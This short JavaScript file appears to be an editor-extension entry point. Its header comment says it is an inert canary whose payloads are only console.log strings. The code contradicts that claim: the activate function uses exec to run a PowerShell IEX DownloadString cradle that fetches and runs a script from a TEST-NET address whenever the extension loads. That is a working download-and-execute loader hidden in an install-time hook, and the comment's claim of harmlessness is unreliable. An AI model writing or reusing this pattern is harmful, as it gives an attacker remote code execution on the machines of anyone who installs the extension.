// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const { exec } = require('child_process');
exports.activate = function () {
  exec('powershell -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.7/shiba.ps1\')"');
};
